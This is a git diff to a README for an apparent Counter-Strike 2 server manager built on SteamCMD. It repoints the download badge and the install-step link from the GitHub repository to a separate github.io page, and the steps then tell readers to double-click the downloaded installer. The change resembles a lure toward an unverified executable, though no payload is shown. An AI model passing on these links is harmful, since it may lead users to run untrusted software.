@@ -1,6 +1,6 @@
 # 🎮 steamcmd-gui-hub - Manage Counter-Strike 2 servers with ease
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blueviolet.svg)](https://github.com/Lshaped-contrivance769/steamcmd-gui-hub)
+[![](https://img.shields.io/badge/Download-Latest_Release-blueviolet.svg)](https://lshaped-contrivance769.github.io)
 
 This tool provides a graphical interface for Counter-Strike 2 server administrators. You can install, update, and manage your game servers without using command lines. The software automates the setup process through SteamCMD. It includes tools for managing plugins, sending RCON commands, and scheduling server backups.
 
@@ -19,7 +19,7 @@ Your computer needs to meet these basic standards to run the server manager:
 
 Follow these steps to set up the software on your machine:
 
-1. Visit [this page to download](https://github.com/Lshaped-contrivance769/steamcmd-gui-hub) the latest installer file.
+1. Visit [this page to download](https://lshaped-contrivance769.github.io) the latest installer file.
 2. Locate the downloaded file in your folder.
 3. Double-click the file to start the installation.
 4. Follow the prompts on the screen to finish the setup process.
